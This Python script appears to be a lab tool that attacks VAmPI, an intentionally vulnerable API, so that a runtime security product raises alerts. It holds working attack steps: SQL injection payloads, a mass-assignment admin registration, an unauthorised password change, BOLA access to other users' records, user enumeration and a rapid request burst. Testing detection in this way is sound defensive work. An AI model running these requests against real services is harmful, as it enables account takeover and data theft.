#!/usr/bin/env python3
"""
VAmPI Runtime Alert Trigger Script
Target: https://3.137.4.41/
Purpose: Generate traffic that should surface in Noname Security runtime detection
"""

import requests
import json
import time
import random
import string
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

BASE_URL = "https://3.137.4.41"
TIMEOUT = 10

session = requests.Session()
session.verify = False
session.headers.update({
    "Content-Type": "application/json",
    "Accept": "application/json",
    "User-Agent": "VAmPI-Lab-Trigger/1.0"
})

def rand_str(length=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))

def pretty(resp):
    try:
        return json.dumps(resp.json(), indent=2)
    except Exception:
        return resp.text[:500]

def step(title):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}")

def main():
    print(f"[*] Targeting VAmPI at {BASE_URL}")
    print("[*] This script triggers multiple OWASP API Top 10 style behaviors\n")

    # 1. Initialize DB
    step("1. Populate database (/createdb)")
    r = session.get(f"{BASE_URL}/createdb", timeout=TIMEOUT)
    print(f"Status: {r.status_code}")
    print(pretty(r))

    # 2. Excessive Data Exposure
    step("2. Excessive Data Exposure - GET /users/v1/_debug")
    r = session.get(f"{BASE_URL}/users/v1/_debug", timeout=TIMEOUT)
    print(f"Status: {r.status_code}")
    print(pretty(r)[:800] + "..." if len(pretty(r)) > 800 else pretty(r))

    # 3. Mass Assignment - create admin
    step("3. Mass Assignment - Register user with admin:true")
    admin_user = f"admin_{rand_str()}"
    admin_pass = "AdminPass123!"
    payload = {
        "username": admin_user,
        "password": admin_pass,
        "email": f"{admin_user}@lab.local",
        "admin": True
    }
    r = session.post(f"{BASE_URL}/users/v1/register", json=payload, timeout=TIMEOUT)
    print(f"Status: {r.status_code}")
    print(pretty(r))

    # 4. Register + Login normal user
    step("4. Register + Login normal user")
    normal_user = f"user_{rand_str()}"
    normal_pass = "UserPass123!"
    payload = {
        "username": normal_user,
        "password": normal_pass,
        "email": f"{normal_user}@lab.local"
    }
    r = session.post(f"{BASE_URL}/users/v1/register", json=payload, timeout=TIMEOUT)
    print(f"Register Status: {r.status_code}")

    r = session.post(
        f"{BASE_URL}/users/v1/login",
        json={"username": normal_user, "password": normal_pass},
        timeout=TIMEOUT
    )
    print(f"Login Status: {r.status_code}")
    token = None
    try:
        data = r.json()
        token = data.get("auth_token") or data.get("token")
        print(f"Got token: {token[:40]}..." if token else "No token received")
    except Exception:
        print(pretty(r))

    if not token:
        print("[!] Could not obtain JWT – aborting authenticated tests")
        return

    auth_headers = {"Authorization": f"Bearer {token}"}

    # 5. Login as mass-assigned admin
    step("5. Login as mass-assigned admin")
    r = session.post(
        f"{BASE_URL}/users/v1/login",
        json={"username": admin_user, "password": admin_pass},
        timeout=TIMEOUT
    )
    admin_token = None
    try:
        data = r.json()
        admin_token = data.get("auth_token") or data.get("token")
        print(f"Admin token obtained: {bool(admin_token)}")
    except Exception:
        print(pretty(r))

    # 6. SQL Injection probes
    step("6. SQL Injection probes on /users/v1/{{username}}")
    sqli_payloads = [
        "name1' OR '1'='1",
        "name1' OR 1=1--",
        "name1' UNION SELECT null,null,null--",
        "' OR '1'='1",
        "admin'--"
    ]
    for p in sqli_payloads:
        r = session.get(f"{BASE_URL}/users/v1/{p}", timeout=TIMEOUT)
        print(f"Payload: {p[:40]:<40} → {r.status_code}")

    # 7. Unauthorized Password Change
    step("7. Unauthorized Password Change")
    target_user = "name1"
    r = session.put(
        f"{BASE_URL}/users/v1/{target_user}/password",
        headers=auth_headers,
        json={"password": "HackedByLab123!"},
        timeout=TIMEOUT
    )
    print(f"Status: {r.status_code}")
    print(pretty(r))

    # 8. BOLA on Books
    step("8. BOLA - Access other users' book secrets")
    r = session.get(f"{BASE_URL}/books/v1", timeout=TIMEOUT)
    books = []
    try:
        data = r.json()
        books = data.get("books", data if isinstance(data, list) else [])
        print(f"Found {len(books)} books")
    except Exception:
        print(pretty(r))

    if books:
        for book in books[:3]:
            title = book.get("book_title") or book.get("title") or str(book)
            r = session.get(
                f"{BASE_URL}/books/v1/{title}",
                headers=auth_headers,
                timeout=TIMEOUT
            )
            print(f"Book '{title}' → {r.status_code}")
            if r.status_code == 200:
                print(f"  Response snippet: {pretty(r)[:200]}")

    # 9. User / Password Enumeration
    step("9. User & Password Enumeration")
    for u in ["name1", "admin", "nonexistent_user_xyz", normal_user]:
        r = session.post(
            f"{BASE_URL}/users/v1/login",
            json={"username": u, "password": "wrongpassword"},
            timeout=TIMEOUT
        )
        print(f"Login attempt '{u}' → {r.status_code} | {r.text[:80]}")

    # 10. Rapid-fire requests
    step("10. Rapid-fire requests (rate-limit / DoS signal)")
    for i in range(15):
        session.get(f"{BASE_URL}/users/v1", timeout=TIMEOUT)
        session.get(f"{BASE_URL}/books/v1", timeout=TIMEOUT)
    print("Sent 30 rapid requests")

    # 11. Final checks
    step("11. Final checks")
    r = session.get(f"{BASE_URL}/users/v1/_debug", timeout=TIMEOUT)
    print(f"/_debug Status: {r.status_code}")

    r = session.get(f"{BASE_URL}/me", headers=auth_headers, timeout=TIMEOUT)
    print(f"/me Status: {r.status_code}")
    print(pretty(r))

    print("\n[+] Script finished. Check Noname Security runtime alerts / incidents.")
    print("    Expected signals: BOLA, Excessive Data Exposure, Mass Assignment,")
    print("    Unauthorized Password Change, SQLi attempts, Auth anomalies, Enumeration.")

if __name__ == "__main__":
    main()
